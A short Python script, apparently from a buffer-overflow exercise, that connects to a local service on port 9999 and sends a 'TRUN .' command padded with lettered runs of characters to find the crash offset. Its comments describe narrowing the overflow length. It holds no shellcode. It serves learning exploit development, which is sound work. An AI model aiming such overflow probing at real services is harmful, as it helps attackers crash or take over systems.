#!/usr/bin/env python
import socket
import sys

# Use a binary tree method to locate where in our input
#  the buffer overflow is occurring.
# Next step would be to add an additional character to
# our buffer to home in on the exact length needed to
# to trigger the overflow.  For example:
# buffer += "A" * 1900 + "B" * 100 + "C" * 25 + "D" * 25
# And so on...

buffer = "TRUN ."
buffer += "A" * 1900 + "B" * 100 + "C" * 50

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1',9999))
print s.recv(1024)
s.send(buffer)
data = s.recv(1024)
print data
s.close()
